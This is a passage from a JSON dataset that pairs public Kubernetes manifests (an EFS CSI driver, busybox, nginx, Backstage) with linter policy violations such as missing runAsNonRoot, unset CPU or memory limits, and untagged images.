    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-provisioner\" is not set to runAsNonRoot"
  },
  {
    "id": "9697",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"efs-plugin\" is not set to runAsNonRoot"
  },
  {
    "id": "9698",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"liveness-probe\" is not set to runAsNonRoot"
  },
  {
    "id": "9699",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"csi-provisioner\" has cpu request 0"
  },
  {
    "id": "9700",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"efs-plugin\" has cpu request 0"
  },
  {
    "id": "9701",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"liveness-probe\" has cpu request 0"
  },
  {
    "id": "9702",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-provisioner\" has memory limit 0"
  },
  {
    "id": "9703",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"efs-plugin\" has memory limit 0"
  },
  {
    "id": "9704",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"liveness-probe\" has memory limit 0"
  },
  {
    "id": "9705",
    "manifest_path": "data/manifests/the_stack_sample/sample_3714.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: ubiq\n  name: ubiq\n  namespace: ethercluster\n  annotations:\n    cloud.google.com/app-protocols: '{\"my-https-port\":\"HTTPS\",\"my-http-port\":\"HTTP\"}'\nspec:\n  selector:\n    app: ubiq\n  ports:\n  - name: default\n    protocol: TCP\n    port: 80\n    targetPort: 80\n  - name: rpc-endpoint\n    port: 8545\n    protocol: TCP\n    targetPort: 8545\n  - name: ws-endpoint\n    port: 8546\n    protocol: TCP\n    targetPort: 8546\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 443\n  type: LoadBalancer\n  sessionAffinity: ClientIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:ubiq])"
  },
  {
    "id": "9706",
    "manifest_path": "data/manifests/the_stack_sample/sample_3715.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: world\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: world\n          image: busybox\n          args:\n          - /bin/sh\n          - -c\n          - date; echo World from the Kubernetes cluster\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"world\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9707",
    "manifest_path": "data/manifests/the_stack_sample/sample_3715.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: world\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: world\n          image: busybox\n          args:\n          - /bin/sh\n          - -c\n          - date; echo World from the Kubernetes cluster\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"world\" does not have a read-only root file system"
  },
  {
    "id": "9708",
    "manifest_path": "data/manifests/the_stack_sample/sample_3715.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: world\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: world\n          image: busybox\n          args:\n          - /bin/sh\n          - -c\n          - date; echo World from the Kubernetes cluster\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"world\" is not set to runAsNonRoot"
  },
  {
    "id": "9709",
    "manifest_path": "data/manifests/the_stack_sample/sample_3715.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: world\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: world\n          image: busybox\n          args:\n          - /bin/sh\n          - -c\n          - date; echo World from the Kubernetes cluster\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"world\" has cpu request 0"
  },
  {
    "id": "9710",
    "manifest_path": "data/manifests/the_stack_sample/sample_3715.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: world\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: world\n          image: busybox\n          args:\n          - /bin/sh\n          - -c\n          - date; echo World from the Kubernetes cluster\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"world\" has memory limit 0"
  },
  {
    "id": "9711",
    "manifest_path": "data/manifests/the_stack_sample/sample_3716.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mks-db\n  namespace: mks\nspec:\n  selector:\n    app: mks-db\n  ports:\n  - name: redis\n    port: 6379\n    targetPort: 6379\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:mks-db])"
  },
  {
    "id": "9712",
    "manifest_path": "data/manifests/the_stack_sample/sample_3717.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-431\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9713",
    "manifest_path": "data/manifests/the_stack_sample/sample_3717.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-431\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9714",
    "manifest_path": "data/manifests/the_stack_sample/sample_3717.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-431\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9715",
    "manifest_path": "data/manifests/the_stack_sample/sample_3717.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-431\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9716",
    "manifest_path": "data/manifests/the_stack_sample/sample_3717.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-431\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9717",
    "manifest_path": "data/manifests/the_stack_sample/sample_3718.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kubia-liveness\nspec:\n  containers:\n  - image: daechoi/kubia-unhealthy\n    name: kubia\n    livenessProbe:\n      httpGet:\n        path: /\n        port: 8080\n      initialDelaySeconds: 15\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kubia\" is using an invalid container image, \"daechoi/kubia-unhealthy\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9718",
    "manifest_path": "data/manifests/the_stack_sample/sample_3718.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kubia-liveness\nspec:\n  containers:\n  - image: daechoi/kubia-unhealthy\n    name: kubia\n    livenessProbe:\n      httpGet:\n        path: /\n        port: 8080\n      initialDelaySeconds: 15\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"kubia\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "9719",
    "manifest_path": "data/manifests/the_stack_sample/sample_3718.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kubia-liveness\nspec:\n  containers:\n  - image: daechoi/kubia-unhealthy\n    name: kubia\n    livenessProbe:\n      httpGet:\n        path: /\n        port: 8080\n      initialDelaySeconds: 15\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kubia\" does not have a read-only root file system"
  },
  {
    "id": "9720",
    "manifest_path": "data/manifests/the_stack_sample/sample_3718.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kubia-liveness\nspec:\n  containers:\n  - image: daechoi/kubia-unhealthy\n    name: kubia\n    livenessProbe:\n      httpGet:\n        path: /\n        port: 8080\n      initialDelaySeconds: 15\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kubia\" is not set to runAsNonRoot"
  },
  {
    "id": "9721",
    "manifest_path": "data/manifests/the_stack_sample/sample_3718.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kubia-liveness\nspec:\n  containers:\n  - image: daechoi/kubia-unhealthy\n    name: kubia\n    livenessProbe:\n      httpGet:\n        path: /\n        port: 8080\n      initialDelaySeconds: 15\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kubia\" has cpu request 0"
  },
  {
    "id": "9722",
    "manifest_path": "data/manifests/the_stack_sample/sample_3718.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kubia-liveness\nspec:\n  containers:\n  - image: daechoi/kubia-unhealthy\n    name: kubia\n    livenessProbe:\n      httpGet:\n        path: /\n        port: 8080\n      initialDelaySeconds: 15\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kubia\" has memory limit 0"
  },
  {
    "id": "9723",
    "manifest_path": "data/manifests/the_stack_sample/sample_3723.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backstage\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: backstage\n  template:\n    metadata:\n      labels:\n        app: backstage\n    spec:\n      containers:\n      - name: backstage\n        image: claudioed/backstage\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 7000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"backstage\" is using an invalid container image, \"claudioed/backstage\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9724",
    "manifest_path": "data/manifests/the_stack_sample/sample_3723.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backstage\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: backstage\n  template:\n    metadata:\n      labels:\n        app: backstage\n    spec:\n      containers:\n      - name: backstage\n        image: claudioed/backstage\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 7000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"backstage\" does not have a read-only root file system"
  },
  {
    "id": "9725",
